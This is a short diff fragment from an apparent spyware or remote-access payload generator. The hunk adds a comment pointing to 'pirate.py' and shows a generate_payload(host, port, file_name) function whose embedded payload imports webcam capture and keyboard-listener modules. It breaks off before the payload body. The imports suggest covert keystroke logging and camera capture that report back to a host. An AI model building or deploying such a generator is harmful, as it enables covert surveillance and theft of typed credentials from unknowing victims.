@@ -1,5 +1,7 @@
 from sys import argv
 
+# payload can now be generated directly from pirate.py (main file)
+
 def generate_payload(host,port,file_name):
     payload ="""from cv2 import VideoCapture, imwrite
 from pynput.keyboard import Key, Listener
